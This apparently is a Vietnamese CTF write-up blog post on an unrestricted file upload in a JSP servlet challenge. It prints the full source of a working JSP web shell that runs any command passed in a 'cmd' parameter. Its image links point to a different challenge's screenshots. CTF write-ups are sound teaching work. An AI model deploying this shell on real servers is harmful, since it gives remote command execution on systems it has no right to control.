---
layout: post
title:  "[HadesCTF] JSP Servlet Upload File"
description: Write-up Web Exploitation HadesCTF
tags: writeup
---
# Web Vulnerability: File upload on JSP Servlet
## Overview
Đề bài:

![image](https://github.com/nguyenngocquang700/nguyenngocquang700.github.io/blob/master/_img/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP-1.png?raw=true)  

Web cho phép ta upload file. Mình đã thử upload bất kì với file extensions cũng đều thành công.  
![image](https://github.com/nguyenngocquang700/nguyenngocquang700.github.io/blob/master/_img/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP-2.png?raw=true)  
Nhưng kì lạ ở chỗ là đến đoạn này, file được upload lên nhưng mình không biết view file như thế nào, mình thử dùng `dirsearch` để scan thử xem còn path nào mà mình có thể khai thác nữa không.  

![image](https://github.com/nguyenngocquang700/nguyenngocquang700.github.io/blob/master/_img/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP-3.png?raw=true)  

Như trong ảnh trên, tool đã scan được khá nhiều path có ích. Nhưng path khiến mình chú ý đến nhất là `/etc/passwd`. Lúc này mình liền nhanh tay vào trang thử nhưng liền bị refuse.  

![image](https://github.com/nguyenngocquang700/nguyenngocquang700.github.io/blob/master/_img/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP-3.png?raw=true)  

Trong cái rủi có cái xui, tuy là vào trang kết quả trả về 404 nhưng ở đây mình phát hiện được rằng bài được code bằng Java và sử dụng JSP Servlet. Tới đây, mình đã thử upload một con web shell execute code và đương nhiên thành công.
Tiếp đó mình thử mở đi đến con shell vừa up theo đường dẫn `/webapp/uploads/filename`. Nói sơ qua về code của shell là tạo form cho phép nhập và thực thi command linux.  
```
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML>
```   
Và kết quả đúng như mong đợi...  
![image](https://github.com/nguyenngocquang700/nguyenngocquang700.github.io/blob/master/_img/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP/2021-02-22-%5BdarkCON-CTF%5D-WTF-PHP-1.png?raw=true)  
Xin lỗi người đang đọc vì đã viết khá sơ xài vì vừa bị xoá file markdown không hiểu vì sao, chắc do định mệnh :))  
Have a good day!!! 

